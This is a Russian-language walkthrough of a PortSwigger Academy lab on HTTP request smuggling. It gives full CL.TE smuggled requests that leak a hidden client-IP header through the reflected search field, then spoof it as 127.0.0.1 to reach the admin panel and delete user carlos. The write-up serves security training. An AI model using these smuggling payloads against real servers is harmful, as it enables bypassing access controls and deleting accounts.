Перейдем на уязвимый ресурс 

и перейдем по директории `/admin` и увидим, что она доступна только под админом или же с `127.0.0.1`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/1.png)

Далее добавим заголовок `X-forwarded-for:127.0.0.1`

и увидим, что нам это тоже не подходит
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/2.png)

Далее согласно мануалу поймем, что на фронте и бэке - `CL Или TE`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/3.png)

Пройдемся согласно мануалу, и нам повезло и срайзу поймем, что тут CL.TE
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-encoding: chunked
Content-Length: 6

3
abc
X
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/4.png)

Сконфигурируем `CL.TE` запрос на просмотр страницы `/admin`
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-encoding: chunked
Content-Length: 99

0

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/5.png)

и отправим ему вдогонку обычный запрос
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и увидим привычную нам напись, что надо быть с `локалхоста, или админской УЗ`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/6.png)

Вернемся в главный запрос и добавим
`X-forwarded-for: 127.0.0.1`

Тем самым получив
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-encoding: chunked
Content-Length: 127

0

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-forwarded-for: 127.0.0.1
Content-Length: 3

x=
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/7.png)

и вдогонку пошлем обычный запрос на корневую страницу
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и увидим, что ничего не изменилось
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/8.png)

Существует гипотеза, что происходит переопределение заголовков, и существует какой-то кастомный заголовок, который выполняет роль `X-forwarded-for`


Так же заметим особенность, что при поисковом запросе, весь поисковый запрос дублируется на стороне фронта
```
search=qwe123
```
`0 search results for 'qwe123'`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/9.png)

отлично, попробуем сделать так, чтобы второй запрос попал в "поисковый" результат, тем самым мы получим все служебные заголовки, которые будут экранированы на фронте

```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-encoding: chunked
Content-Length: 104

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

search=123
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/10.png)

и отправим вдогонку второй запрос 
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и увидим, что существует заголовок
`X-xhZoVo-Ip: 171.33.248.178`

отлично
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/11.png)

Вернемся к запросу, и попробуем теперь добраться до админской панели 

```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-encoding: chunked
Content-Length: 123

0

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-xhZoVo-Ip: 127.0.0.1
Content-Length: 3

x=
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/12.png)

и отправим вдогонку второй запрос 
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и видим, что нас пустило на админскую панель
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/13.png)

Далее удалим carlos'a как этого и требует задание

```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-encoding: chunked
Content-Length: 146

0

POST /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-xhZoVo-Ip: 127.0.0.1
Content-Length: 3

x=
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/14.png)

и вдогонку отправим второй запрос 
```
POST / HTTP/1.1
Host: 0a04000204078b8b809eee63003400eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и после всех редиректов увидим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/8.%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting/pics%20for%20walkthrough/15.png)
